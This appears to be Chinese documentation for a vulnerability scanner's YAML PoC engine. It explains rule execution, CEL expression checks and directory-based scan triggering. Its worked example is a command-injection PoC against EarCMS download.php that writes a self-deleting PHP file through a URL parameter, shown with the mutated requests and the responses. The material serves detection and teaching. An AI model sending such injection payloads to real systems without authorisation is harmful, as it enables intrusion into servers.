# POC运行逻辑

## 运行逻辑

在一个 yaml poc 从文件加载到 go 的某个结构后，会首先对表达式进行预编译和静态类型检查，这一过程主要作用于 yaml 中的 set 和 expression 部分，这两部分是 yaml poc 的关键，主要用到了 CEL 表达式。

在检查完成后，内存中的 poc 就处于等待调度的状态了。每当有**新的请求**来临时，会执行类似如下的伪代码:

```go
for rule in rules:
    newReq = mutate_request_by_rule(req, rule)
    response = send(newReq)
    if not check_response(response, rule):
        break
```

简单来讲就是将请求根据 rule 中的规则对请求变形，然后获取变形后的响应，再检查响应是否匹配 `expression` 部分的表达式。如果匹配，就进行下一个 rule，如果不匹配则退出执行。

如果成功执行完了最后一个 rule，那么代表目标有漏洞，将 detail 中的信息附加到漏洞输出后就完成了单个 poc 的整个流程。

拿一个真实的poc来举例：

```yaml
name: poc-yaml-earcms-download-php-exec
manual: true
transport: http
set:
    r1: randomInt(40000, 44800)
    randname: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{randname}}.php%3B
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /source/pack/127.0.0.1/{{randname}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
expression: r0() && r1()
detail:
    author: sharecast
    links:
        - https://zhuanlan.zhihu.com/p/81934322
    vulnerability:
        id: CT-416446
```

当系统得到该poc后，会将rules拆分成一个个rule，例如r0，r1，并根据与rules同一个层级的expression来控制这些规则的发送顺序与最后是否有漏洞的判断。

然后就会等待请求接收过来，例如这样一个请求：

```
GET / HTTP/1.1
Host: www.xxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close
```

然后系统会将r0中的内容与该请求进行结合，使得上述请求变为如下：

```
GET /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%2841463%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+skqgld.php%3B HTTP/1.1
Host: www.xxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close
```

其中的随机数{{r1}}将被替换为系统按要求生成的随机数41463，然后在组织好之后，发送出去，并接收一个返回包(包体已忽略)

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 10 Jun 2022 07:11:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000
Content-Length: 3316

xxxxxxxxxxxxxxxxxxxxxxx
```

这时会有一个函数来解析r0中的expression，例如这个expression，系统会匹配返回包中的状态码是否是200，如果是，则这个规则的状态将会为true，那么将会进入到下一个rule，并构建一个新的请求：

```
GET /source/pack/127.0.0.1/skqgld.php HTTP/1.1
Host: www.xxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close
```

可以发现规则中的path：/source/pack/127.0.0.1/{{randname}}.php已经被替换为/source/pack/127.0.0.1/skqgld.php并合并入新的请求中，然后接收到一个新的返回包：

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 10 Jun 2022 07:11:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000
Content-Length: 32

5c7fcde320b91be7c4cf317a6115910a
```

然后系统会将{{r1}}这个随机数，也就是41463进行md5加密，然后用加密后的结果去返回包中匹配，匹配到了则返回true。

这个时候，与rules同一个层级的expression会发现两个规则都是true，满足`r0() && r1()` 这样一个条件，于是便确认存在该漏洞，将该漏洞输出。

## 加载逻辑

目前版本的实现对**新的请求**定义为: **新的目录**, 比如下面几个 url 依次进入检查队列时，执行情况如下：

```
http://exmaple.com/     会执行, 上下文为 / 
http://example.com/a    不会再次执行，因为上下文同样为 /
http://example.com/a/b  会执行，上下文为 /a/
http://example.com/a/c/ 不会执行, 超过深度限制 (depth)
```

其中 `depth` 是 phantasm 插件的一个配置项，用于指定检测深度，可以参考： [插件配置](/configration/plugins?id=dirscan)